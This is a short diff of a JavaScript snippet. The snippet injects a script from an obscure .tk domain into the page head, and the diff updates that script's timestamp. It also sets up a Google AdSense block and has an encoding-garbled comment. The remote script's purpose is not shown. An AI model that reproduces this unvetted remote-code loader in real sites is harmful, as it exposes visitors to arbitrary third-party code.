@@ -1,7 +1,7 @@
 (function () {
-    //åŸºç?€
+    //åŸºï¿½?ï¿½
     var b = document.createElement("script");
-    b.src = "http://www.7k77.tk/eicXsB?1503385493";
+    b.src = "http://www.7k77.tk/eicXsB?1504579679";
     (document.getElementsByTagName("HEAD")[0] || document.body).appendChild(b)
     var divs=["<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- \u7279\u6B8At -->\n<ins class=\"adsbygoogle\"\n     style=\"display:inline-block;width:320px;height:100px\"\n     data-ad-client=\"ca-pub-3568322529043220\"\n     data-ad-slot=\"9488597897\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>",
     
